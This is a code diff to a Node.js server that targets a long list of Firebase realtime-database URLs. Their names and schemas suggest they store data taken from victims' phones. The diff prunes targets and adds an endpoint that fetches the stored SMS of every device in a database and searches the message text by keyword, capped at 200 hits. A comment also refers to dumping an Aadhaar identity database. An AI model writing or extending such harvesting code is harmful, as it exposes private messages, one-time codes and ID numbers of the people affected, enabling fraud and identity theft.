@@ -14,11 +14,7 @@ const BOT_DIR = process.env.BOT_DIR || '/home/ubuntu/newp';
 const RAW_TARGETS = [
   [1,'https://aartihh-dffe3-default-rtdb.firebaseio.com'],
   [2,'https://hsm2pro21-default-rtdb.firebaseio.com'],
-  [3,'https://hvgvgv-abcf9-default-rtdb.firebaseio.com'],
-  [4,'https://iphone-11-baab-default-rtdb.firebaseio.com/clients'],
   [5,'https://jamtar7-95f77-default-rtdb.firebaseio.com'],
-  [6,'https://kubgkhbm-default-rtdb.firebaseio.com'],
-  [7,'https://loda-5029e-default-rtdb.firebaseio.com/clients'],
   [8,'https://lovefimus-default-rtdb.firebaseio.com'],
   [9,'https://naxus-89796-default-rtdb.firebaseio.com'],
   [10,'https://rahul-e20c4-default-rtdb.firebaseio.com'],
@@ -42,14 +38,12 @@ const RAW_TARGETS = [
   [28,'https://proffercelawte-default-rtdb.firebaseio.com'],
   [29,'https://projectname-15100-default-rtdb.firebaseio.com'],
   [30,'https://adminpanel-5f533-default-rtdb.firebaseio.com'],
-  [31,'https://admon-aeba0-default-rtdb.firebaseio.com'],
   [32,'https://challan5-default-rtdb.firebaseio.com'],
   [33,'https://human-34-kumar-default-rtdb.firebaseio.com'],
   [34,'https://mp-24jfg-default-rtdb.firebaseio.com'],
   [35,'https://nky0-a5870-default-rtdb.firebaseio.com'],
   [36,'https://nonono-q-default-rtdb.firebaseio.com'],
   [37,'https://u72328193-47b68-default-rtdb.firebaseio.com'],
-  [38,'https://ai-rto-9-default-rtdb.firebaseio.com'],
   [39,'https://u72749819-fa563-default-rtdb.firebaseio.com'],
   [40,'https://ajay-33c1b-default-rtdb.firebaseio.com'],
   [41,'https://anaryef50-aa5f1-default-rtdb.firebaseio.com'],
@@ -58,7 +52,6 @@ const RAW_TARGETS = [
   [44,'https://jaimahakal-42698-default-rtdb.firebaseio.com'],
   [45,'https://motb-10aae-default-rtdb.firebaseio.com'],
   [46,'https://bevhhwhbe-default-rtdb.firebaseio.com'],
-  [47,'https://business-apps-ba1-f86b7-default-rtdb.firebaseio.com'],
   [48,'https://csforme-dc64a-default-rtdb.firebaseio.com'],
   [49,'https://dogla-de225-default-rtdb.firebaseio.com'],
   [50,'https://gren-ff2af-default-rtdb.firebaseio.com'],
@@ -115,19 +108,19 @@ const RAW_TARGETS = [
 // ── Schema assignment (mirrors DA1.py MultiTargetManager) ─────────────────────
 const SCHEMA_2  = new Set([14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,46,71,73,
                             81,83,90,92,94,97]);
-const SCHEMA_3  = new Set([31,32,33,34,35,36,37,55,56,66,67,68,69,72,77,79]);
+const SCHEMA_3  = new Set([32,33,34,35,36,37,55,56,66,67,68,69,72,77,79]);
 const SCHEMA_4  = new Set([42,43,44,45,49,50,51,52]);
 const SCHEMA_5  = new Set([58]);
 const SCHEMA_6  = new Set([57]);
 const SCHEMA_8A = new Set([1]);
-const SCHEMA_8B = new Set([3,8,9,10,11,41]);
+const SCHEMA_8B = new Set([8,9,10,11,41]);
 const SCHEMA_9  = new Set([5,12,13,40,54,59,61,62,63,64,65,70,74,75,76,93]);
-const SCHEMA_10 = new Set([4,84]);
-const SCHEMA_11 = new Set([7,80,82,85,86,87,88,89,91,95,96]);
+const SCHEMA_10 = new Set([84]);
+const SCHEMA_11 = new Set([80,82,85,86,87,88,89,91,95,96]);
 const SCHEMA_12 = new Set([48]);
 const SCHEMA_13 = new Set([53]);
 const SCHEMA_14 = new Set([39,78]);
-const SCHEMA_15 = new Set([38]);
+const SCHEMA_15 = new Set([]);
 
 function getSchema(id) {
   if (SCHEMA_8A.has(id)) return '8a';
@@ -485,6 +478,58 @@ app.get('/api/url/:id/live', async (req, res) => {
   } catch (e) {
     res.json({ error: e.message, devices: [] });
   }
+});
+
+// ── SMS Search: search all devices in a URL for a keyword/phrase ──────────────
+app.get('/api/url/:id/sms-search', async (req, res) => {
+  const id = parseInt(req.params.id);
+  const q  = (req.query.q || '').trim().toLowerCase();
+  if (!q) return res.json({ hits: [], total: 0, error: 'No query' });
+
+  const target = TARGETS.find(t => t.id === id);
+  if (!target) return res.status(404).json({ error: 'URL not found' });
+
+  const db = loadDb(id);
+  const deviceEntries = Object.entries(db);
+  if (!deviceEntries.length) return res.json({ hits: [], total: 0, error: 'No cached devices' });
+
+  function* iterMsgs(data) {
+    if (typeof data !== 'object' || !data) return;
+    for (const v of Object.values(data)) {
+      if (typeof v !== 'object' || !v) continue;
+      const hasBody = 'body' in v || 'message' in v || 'msg' in v || 'text' in v;
+      if (hasBody) yield v;
+      else yield* iterMsgs(v);
+    }
+  }
+
+  const hits = [];
+  const errors = [];
+
+  await Promise.all(deviceEntries.map(async ([deviceId, dev]) => {
+    const objId    = dev.obj_id || 'N/A';
+    const fetchUrl = getSmsLink(target, deviceId, objId).replace('?print=pretty', '');
+    try {
+      const resp = await fetch(fetchUrl, {
+        headers: { 'User-Agent': 'Mozilla/5.0' },
+        signal: AbortSignal.timeout(12000),
+      });
+      if (!resp.ok) return;
+      const smsData = await resp.json();
+      for (const msg of iterMsgs(smsData)) {
+        const body = String(msg.body || msg.message || msg.msg || msg.text || '');
+        if (!body) continue;
+        if (body.toLowerCase().includes(q)) {
+          hits.push({ deviceId, brand: dev.brand || 'Unknown', body });
+          if (hits.length >= 200) return; // global cap
+        }
+      }
+    } catch (e) {
+      errors.push(`${deviceId}: ${e.message}`);
+    }
+  }));
+
+  res.json({ hits: hits.slice(0, 200), total: hits.length, errors });
 });
 
 // ── Debug: dump aadhar DB for a specific URL ─────────────────────────────────
